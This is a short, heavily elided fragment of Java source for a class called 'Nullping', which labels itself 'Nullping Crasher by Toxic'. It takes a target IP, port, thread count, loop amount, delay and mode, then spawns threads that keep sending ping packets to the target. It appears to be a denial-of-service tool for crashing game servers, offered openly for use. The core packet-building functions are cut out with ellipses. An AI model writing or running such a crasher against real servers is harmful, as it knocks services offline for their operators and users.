...
public class Nullping {
   ...
   public static void main(String[] args) {
      if (args.length == 6) {
         try {
            pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]), Integer.valueOf(args[3]), Long.valueOf(args[4]), Integer.valueOf(args[5]));
         } catch (NumberFormatException var2) {
            System.out.println("The Port/Thread/Amount/Delay/Mode has to be a Number!");
         }
      } else {
         System.out.println("<------------------------------------------------------------------------->");
         System.out.println("                      Nullping Crasher by Toxic youtube.com/@Toxfc                       ");
         System.out.println("");
         System.out.println("");
         ...
         if (threads < maxThreads) {
            (new Thread() {
               public void run() {
                  ...
                  try {
                     if (mode == 1) {
                        Nullping.pingBytes(Nullping.number + 1);
                        Nullping.localhost(ip, port, loopAmount);
                        System.out.println("New   #" + Nullping.number);
                     } else if (mode == 2) {
                        Nullping.pingBytes(Nullping.number + 1);
